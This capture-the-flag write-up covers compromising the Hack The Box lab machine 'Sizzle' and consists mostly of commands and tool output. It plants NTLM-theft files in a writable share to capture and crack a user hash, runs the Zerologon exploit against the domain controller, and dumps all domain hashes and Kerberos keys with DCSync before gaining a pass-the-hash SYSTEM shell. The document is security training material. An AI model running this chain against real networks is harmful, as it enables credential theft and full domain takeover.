---
title: Sizzle
summary: Insane Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), Department Shares, Watering hole attack.
date: 2026-04-06
tags: [Hack The Box, Active Directory, Windows]
difficulty: insane
os: Windows
url: https://app.hackthebox.com/machines/Sizzle
author: Ethan Bauer
author_url: https://github.com/ethanbauer10
source: https://github.com/ethanbauer10/Obsidian/blob/main/HackTheBox/Sizzle%20%5BInsane%20-%20AD%5D/Sizzle%20%5BAD%5D%20%5BInsane%5D.md
---

# Sizzle
## Host file setup
```python
sudo nxc smb 10.129.19.191 --generate-hosts-file /etc/hosts
[sudo] password for kali: 
SMB         10.129.19.191   445    SIZZLE           [*] Windows 10 / Server 2016 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
```
- SMB signing is enabled
- Null auth 
## Enumeration
### Open ports
```python
nmap -p- --min-rate=2000 -sT -Pn 10.129.19.191                                                       
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-15 16:09 +0100
Nmap scan report for 10.129.19.191
Host is up (0.014s latency).
Not shown: 65507 filtered tcp ports (no-response)
PORT      STATE SERVICE
21/tcp    open  ftp
53/tcp    open  domain
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
5986/tcp  open  wsmans
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49673/tcp open  unknown
49688/tcp open  unknown
49689/tcp open  unknown
49692/tcp open  unknown
49695/tcp open  unknown
49710/tcp open  unknown
49720/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 66.19 seconds
```

### Nmap
```python
nmap -p 21,53,80,135,139,389,443,445,464,593,636,3268,3269,5985,5986,9389 -A --min-rate=2000 -sT -Pn sizzle.htb.local
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-15 16:13 +0100
Nmap scan report for sizzle.htb.local (10.129.19.191)
Host is up (0.014s latency).
rDNS record for 10.129.19.191: SIZZLE.HTB.LOCAL

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2021-02-11T12:59:51
|_Not valid after:  2022-02-11T12:59:51
|_ssl-date: 2026-04-15T15:15:29+00:00; 0s from scanner time.
443/tcp  open  ssl/https?
|_ssl-date: 2026-04-15T15:15:29+00:00; 0s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2021-02-11T12:59:51
|_Not valid after:  2022-02-11T12:59:51
|_ssl-date: 2026-04-15T15:15:29+00:00; 0s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
|_ssl-date: 2026-04-15T15:15:29+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2021-02-11T12:59:51
|_Not valid after:  2022-02-11T12:59:51
3269/tcp open  ssl/ldap
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2021-02-11T12:59:51
|_Not valid after:  2022-02-11T12:59:51
|_ssl-date: 2026-04-15T15:15:29+00:00; 0s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp open  ssl/wsmans?
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2021-02-11T12:59:51
|_Not valid after:  2022-02-11T12:59:51
|_ssl-date: 2026-04-15T15:15:29+00:00; 0s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012|2016|2008|7 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2016 (89%), Microsoft Windows 7 or Windows Server 2008 R2 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows
```

## SMB (445)
Null auth enabled but not able to use it to enumerate shares or users

### Guest access
#### Shares
```python
nxc smb sizzle.htb.local -u 'Guest' -p '' --shares
SMB         10.129.19.191   445    SIZZLE           [*] Windows 10 / Server 2016 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.19.191   445    SIZZLE           [+] HTB.LOCAL\Guest: 
SMB         10.129.19.191   445    SIZZLE           [*] Enumerated shares
SMB         10.129.19.191   445    SIZZLE           Share           Permissions     Remark
SMB         10.129.19.191   445    SIZZLE           -----           -----------     ------
SMB         10.129.19.191   445    SIZZLE           ADMIN$                          Remote Admin
SMB         10.129.19.191   445    SIZZLE           C$                              Default share
SMB         10.129.19.191   445    SIZZLE           CertEnroll                      Active Directory Certificate Services share
SMB         10.129.19.191   445    SIZZLE           Department Shares READ            
SMB         10.129.19.191   445    SIZZLE           IPC$            READ            Remote IPC
SMB         10.129.19.191   445    SIZZLE           NETLOGON                        Logon server share 
SMB         10.129.19.191   445    SIZZLE           Operations                      
SMB         10.129.19.191   445    SIZZLE           SYSVOL                          Logon server share
```
Read access on `Department Shares` and `IPC$`
#### Users
```python
nxc smb sizzle.htb.local -u 'Guest' -p '' --rid-brute 20000
SMB         10.129.19.191   445    SIZZLE           [*] Windows 10 / Server 2016 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.19.191   445    SIZZLE           [+] HTB.LOCAL\Guest: 
SMB         10.129.19.191   445    SIZZLE           498: HTB\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.19.191   445    SIZZLE           500: HTB\Administrator (SidTypeUser)
SMB         10.129.19.191   445    SIZZLE           501: HTB\Guest (SidTypeUser)
SMB         10.129.19.191   445    SIZZLE           502: HTB\krbtgt (SidTypeUser)
SMB         10.129.19.191   445    SIZZLE           503: HTB\DefaultAccount (SidTypeUser)
SMB         10.129.19.191   445    SIZZLE           512: HTB\Domain Admins (SidTypeGroup)
SMB         10.129.19.191   445    SIZZLE           513: HTB\Domain Users (SidTypeGroup)
SMB         10.129.19.191   445    SIZZLE           514: HTB\Domain Guests (SidTypeGroup)
SMB         10.129.19.191   445    SIZZLE           515: HTB\Domain Computers (SidTypeGroup)
SMB         10.129.19.191   445    SIZZLE           516: HTB\Domain Controllers (SidTypeGroup)
SMB         10.129.19.191   445    SIZZLE           517: HTB\Cert Publishers (SidTypeAlias)
SMB         10.129.19.191   445    SIZZLE           518: HTB\Schema Admins (SidTypeGroup)
SMB         10.129.19.191   445    SIZZLE           519: HTB\Enterprise Admins (SidTypeGroup)
SMB         10.129.19.191   445    SIZZLE           520: HTB\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.19.191   445    SIZZLE           521: HTB\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.19.191   445    SIZZLE           522: HTB\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.19.191   445    SIZZLE           525: HTB\Protected Users (SidTypeGroup)
SMB         10.129.19.191   445    SIZZLE           526: HTB\Key Admins (SidTypeGroup)
SMB         10.129.19.191   445    SIZZLE           527: HTB\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.19.191   445    SIZZLE           553: HTB\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.19.191   445    SIZZLE           571: HTB\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.19.191   445    SIZZLE           572: HTB\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.19.191   445    SIZZLE           1001: HTB\SIZZLE$ (SidTypeUser)
SMB         10.129.19.191   445    SIZZLE           1102: HTB\DnsAdmins (SidTypeAlias)
SMB         10.129.19.191   445    SIZZLE           1103: HTB\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.19.191   445    SIZZLE           1104: HTB\amanda (SidTypeUser)
SMB         10.129.19.191   445    SIZZLE           1603: HTB\mrlky (SidTypeUser)
SMB         10.129.19.191   445    SIZZLE           1604: HTB\sizzler (SidTypeUser)
```
Found all the users

```python
nxc smb sizzle.htb.local -u 'Guest' -p '' --rid-brute 20000 | grep '(SidTypeUser)' | cut -d '\' -f 2 | cut -d ' ' -f 1 > users.txt
```
Ive re-ran this using some extra commands to pull the users out of the output

```python
cat users.txt   
Administrator
Guest
krbtgt
DefaultAccount
SIZZLE$
amanda
mrlky
sizzler
```
All the users

## `Department Shares`
```python
smbclient //sizzle.htb.local/'Department Shares' -U 'Guest'%''                                         
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jul  3 16:22:32 2018
  ..                                  D        0  Tue Jul  3 16:22:32 2018
  Accounting                          D        0  Mon Jul  2 20:21:43 2018
  Audit                               D        0  Mon Jul  2 20:14:28 2018
  Banking                             D        0  Tue Jul  3 16:22:39 2018
  CEO_protected                       D        0  Mon Jul  2 20:15:01 2018
  Devops                              D        0  Mon Jul  2 20:19:33 2018
  Finance                             D        0  Mon Jul  2 20:11:57 2018
  HR                                  D        0  Mon Jul  2 20:16:11 2018
  Infosec                             D        0  Mon Jul  2 20:14:24 2018
  Infrastructure                      D        0  Mon Jul  2 20:13:59 2018
  IT                                  D        0  Mon Jul  2 20:12:04 2018
  Legal                               D        0  Mon Jul  2 20:12:09 2018
  M&A                                 D        0  Mon Jul  2 20:15:25 2018
  Marketing                           D        0  Mon Jul  2 20:14:43 2018
  R&D                                 D        0  Mon Jul  2 20:11:47 2018
  Sales                               D        0  Mon Jul  2 20:14:37 2018
  Security                            D        0  Mon Jul  2 20:21:47 2018
  Tax                                 D        0  Mon Jul  2 20:16:54 2018
  Users                               D        0  Tue Jul 10 22:39:32 2018
  ZZ_ARCHIVE                          D        0  Mon Jul  2 20:32:58 2018

		7779839 blocks of size 4096. 3166383 blocks available
smb: \>
```
Only `Users` and `ZZ_ARCHIVE` and `Tax` contain data

The path `Users/Public/` is writable in SMB i can try a watering hole attack

## Watering hole attack
```python
python3 ntlm_theft.py -g all -s 10.10.14.90 -f meeting
/home/kali/htb/Sizzle/ntlm_theft/ntlm_theft.py:168: SyntaxWarning: invalid escape sequence '\l'
  location.href = 'ms-word:ofe|u|\\''' + server + '''\leak\leak.docx';
Created: meeting/meeting.scf (BROWSE TO FOLDER)
Created: meeting/meeting-(url).url (BROWSE TO FOLDER)
Created: meeting/meeting-(icon).url (BROWSE TO FOLDER)
Created: meeting/meeting.lnk (BROWSE TO FOLDER)
Created: meeting/meeting.rtf (OPEN)
Created: meeting/meeting-(stylesheet).xml (OPEN)
Created: meeting/meeting-(fulldocx).xml (OPEN)
Created: meeting/meeting.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: meeting/meeting-(handler).htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: meeting/meeting-(includepicture).docx (OPEN)
Created: meeting/meeting-(remotetemplate).docx (OPEN)
Created: meeting/meeting-(frameset).docx (OPEN)
Created: meeting/meeting-(externalcell).xlsx (OPEN)
Created: meeting/meeting.wax (OPEN)
Created: meeting/meeting.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: meeting/meeting.asx (OPEN)
Created: meeting/meeting.jnlp (OPEN)
Created: meeting/meeting.application (DOWNLOAD AND OPEN)
Created: meeting/meeting.pdf (OPEN AND ALLOW)
Created: meeting/zoom-attack-instructions.txt (PASTE TO CHAT)
Created: meeting/meeting.library-ms (BROWSE TO FOLDER)
Created: meeting/Autorun.inf (BROWSE TO FOLDER)
Created: meeting/desktop.ini (BROWSE TO FOLDER)
Created: meeting/meeting.theme (THEME TO INSTALL
Generation Complete.
```
First ill generate the files with my IP address inside

```python
sudo responder -I tun0
```
This started a listener

```python
smb: \Users\Public\> prompt off
smb: \Users\Public\> mput meeting*
```
This planted the files in the share

```python
[SMB] NTLMv2-SSP Client   : 10.129.19.191
[SMB] NTLMv2-SSP Username : HTB\amanda
[SMB] NTLMv2-SSP Hash     : amanda::HTB:86c0335d88d43520:103EB57BE6B34F59ED9721CF15B92335:010100000000000080EE9EC0F4CCDC015EA13D572A34B0590000000002000800590058004400530001001E00570049004E002D004E004200490038003000390050004D0030003300590004003400570049004E002D004E004200490038003000390050004D003000330059002E0059005800440053002E004C004F00430041004C000300140059005800440053002E004C004F00430041004C000500140059005800440053002E004C004F00430041004C000700080080EE9EC0F4CCDC01060004000200000008003000300000000000000001000000002000007F8946A95DC4C9A5217BF48DC3C2A224BE254FAC65F2034534200E8F6F1797350A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0039003000000000000000000000000000
[*] Skipping previously captured hash for HTB\amanda
[*] Skipping previously captured hash for HTB\amanda
```
Ive captured a hash

### Cracking the hash
```python
hashcat amanda.hash /usr/share/wordlists/rockyou.txt


AMANDA::HTB:86c0335d88d43520:103eb57be6b34f59ed9721cf15b92335:010100000000000080ee9ec0f4ccdc015ea13d572a34b0590000000002000800590058004400530001001e00570049004e002d004e004200490038003000390050004d0030003300590004003400570049004e002d004e004200490038003000390050004d003000330059002e0059005800440053002e004c004f00430041004c000300140059005800440053002e004c004f00430041004c000500140059005800440053002e004c004f00430041004c000700080080ee9ec0f4ccdc01060004000200000008003000300000000000000001000000002000007f8946a95dc4c9a5217bf48dc3c2a224be254fac65f2034534200e8f6f1797350a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0039003000000000000000000000000000:Ashare1972
```
The hash cracked!

```python
amanda:Ashare1972
```
Ill verify these credentials

```python
nxc smb sizzle.htb.local -u 'amanda' -p 'Ashare1972'                                                                              
SMB         10.129.19.191   445    SIZZLE           [*] Windows 10 / Server 2016 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.19.191   445    SIZZLE           [+] HTB.LOCAL\amanda:Ashare1972
```
This user is compromised

## Domain Admin via zerologon
```python
nxc smb sizzle.htb.local -u 'amanda' -p 'Ashare1972' -M zerologon                     
SMB         10.129.19.191   445    SIZZLE           [*] Windows 10 / Server 2016 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.19.191   445    SIZZLE           [+] HTB.LOCAL\amanda:Ashare1972 
ZEROLOGON   10.129.19.191   445    SIZZLE           VULNERABLE
ZEROLOGON   10.129.19.191   445    SIZZLE           Next step: https://github.com/dirkjanm/CVE-2020-1472
```
This version is vulnerable to zerologon

```python
python3 cve-2020-1472-exploit.py SIZZLE 10.129.19.191                                                                        
Performing authentication attempts...
=======================================================================================================================================
Target vulnerable, changing account password to empty string

Result: 0

Exploit complete!
```
This set the DC machine account password to an empty string so now i should be able to perform a DCSync

```python
impacket-secretsdump -no-pass SIZZLE\$@10.129.19.191 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::
mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
sizzler:1604:aad3b435b51404eeaad3b435b51404ee:d79f820afad0cbc828d79e16a6f890de:::
SIZZLE$:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SIZZLE:4102:aad3b435b51404eeaad3b435b51404ee:dce911fab66919eac6b0e9642a664914:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:e562d64208c7df80b496af280603773ea7d7eeb93ef715392a8258214933275d
Administrator:aes128-cts-hmac-sha1-96:45b1a7ed336bafe1f1e0c1ab666336b3
Administrator:des-cbc-md5:ad7afb706715e964
krbtgt:aes256-cts-hmac-sha1-96:0fcb9a54f68453be5dd01fe555cace13e99def7699b85deda866a71a74e9391e
krbtgt:aes128-cts-hmac-sha1-96:668b69e6bb7f76fa1bcd3a638e93e699
krbtgt:des-cbc-md5:866db35eb9ec5173
amanda:aes256-cts-hmac-sha1-96:60ef71f6446370bab3a52634c3708ed8a0af424fdcb045f3f5fbde5ff05221eb
amanda:aes128-cts-hmac-sha1-96:48d91184cecdc906ca7a07ccbe42e061
amanda:des-cbc-md5:70ba677a4c1a2adf
mrlky:aes256-cts-hmac-sha1-96:b42493c2e8ef350d257e68cc93a155643330c6b5e46a931315c2e23984b11155
mrlky:aes128-cts-hmac-sha1-96:3daab3d6ea94d236b44083309f4f3db0
mrlky:des-cbc-md5:02f1a4da0432f7f7
sizzler:aes256-cts-hmac-sha1-96:85b437e31c055786104b514f98fdf2a520569174cbfc7ba2c895b0f05a7ec81d
sizzler:aes128-cts-hmac-sha1-96:e31015d07e48c21bbd72955641423955
sizzler:des-cbc-md5:5d51d30e68d092d9
SIZZLE$:aes256-cts-hmac-sha1-96:6ecf1fe4c6bf3af55197960feba8a92dd8d321e18b688006a9bb09c91725f3a7
SIZZLE$:aes128-cts-hmac-sha1-96:f98d2b4ca1357ba73c4f7c17f104bd11
SIZZLE$:des-cbc-md5:92bf08aee6a16129
SIZZLE:aes256-cts-hmac-sha1-96:ed2668745f5d855178849f940922fa590ead78adfa28933b91eee6c598d405c0
SIZZLE:aes128-cts-hmac-sha1-96:7467d76a4f41bf7ebf02fc3aa25a35eb
SIZZLE:des-cbc-md5:15c4d3ef49efcd4f
[*] Cleaning up...
```
I now have all the hashes but looking at bloodhound the domain admins are `administrator` and `sizzler` and neither of these are part of the remote management users group

So ill have to use `wmiexec` or `psexec`

```python
impacket-psexec htb.local/sizzler@sizzle.htb.local -hashes ':d79f820afad0cbc828d79e16a6f890de'                                                                    
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on sizzle.htb.local.....
[*] Found writable share ADMIN$
[*] Uploading file NCGyjYuQ.exe
[*] Opening SVCManager on sizzle.htb.local.....
[*] Creating service bASB on sizzle.htb.local.....
[*] Starting service bASB.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32>
```

```python
C:\Users\administrator\Desktop> type root.txt
||3d145f419d6c6220b30232a2ee8e7233||

C:\Users\administrator\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State   
========================================= ================================================================== ========
SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled 
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeTcbPrivilege                            Act as part of the operating system                                Enabled 
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled 
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled 
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled 
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled 
SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled 
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled 
SeAuditPrivilege                          Generate security audits                                           Enabled 
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled 
SeCreateGlobalPrivilege                   Create global objects                                              Enabled 
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled 
SeTimeZonePrivilege                       Change the time zone                                               Enabled 
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled 
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled 

C:\Users\administrator\Desktop> 
```
Full domain compromise using zerologon
